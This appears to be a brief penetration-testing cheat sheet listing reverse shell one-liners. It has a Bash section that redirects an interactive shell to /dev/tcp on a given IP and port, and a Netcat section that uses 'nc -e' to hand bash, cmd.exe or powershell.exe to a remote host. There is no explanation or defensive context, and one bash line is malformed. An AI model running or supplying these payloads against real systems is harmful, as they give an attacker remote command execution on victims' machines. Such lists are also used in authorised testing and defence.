## Bash

```
bash -i >& /dev/tcp/192.168.1.10/8080 0>&1
/bin/bash -c '/bin/bash -i >& /dev/tcp/$IP/$port/ 0>&'
```
## Netcat 
nc -e /bin/bash $IP $port 
nc -e cmd.exe $IP $port 
nc -e powershell.exe $IP $port
```
